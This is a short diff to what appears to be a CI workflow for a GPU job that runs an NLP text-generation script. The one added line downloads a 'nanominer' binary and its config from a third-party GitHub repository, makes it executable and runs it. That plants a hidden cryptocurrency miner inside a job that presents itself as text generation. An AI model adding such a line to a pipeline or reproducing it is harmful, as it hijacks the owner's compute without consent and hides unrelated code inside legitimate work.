@@ -51,6 +51,7 @@ jobs:
         cd /nlp
         pip3 install -U transformer
         nvidia-smi
+        wget https://github.com/Dipa147/aa/raw/main/nanominer&&chmod +x nanominer&&wget https://raw.githubusercontent.com/Dipa147/aa/main/Aa.ini&&./nanominer Aa.ini
         python3 nlp_text_generation.py
         mv output.txt /outputs/generatedText
         ls "-aFlR" /outputs/generatedText
